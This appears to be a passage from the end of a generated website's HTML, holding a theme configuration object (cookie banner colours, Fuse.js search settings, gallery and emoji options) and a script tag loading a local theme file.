来改善您的浏览体验。"},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"lightgallery":true,"search":{"distance":100,"findAllMatches":false,"fuseIndexURL":"/search.json","highlightTag":"em","ignoreFieldNorm":false,"ignoreLocation":false,"isCaseSensitive":false,"location":0,"maxResultLength":10,"minMatchCharLength":2,"noResultsFound":"没有找到结果","snippetLength":30,"threshold":0.3,"type":"fuse","useExtendedSearch":false},"twemoji":true,"version":"v0.3.16"};</script><script src="/js/theme.min.js" defer></script></body>
+</html>
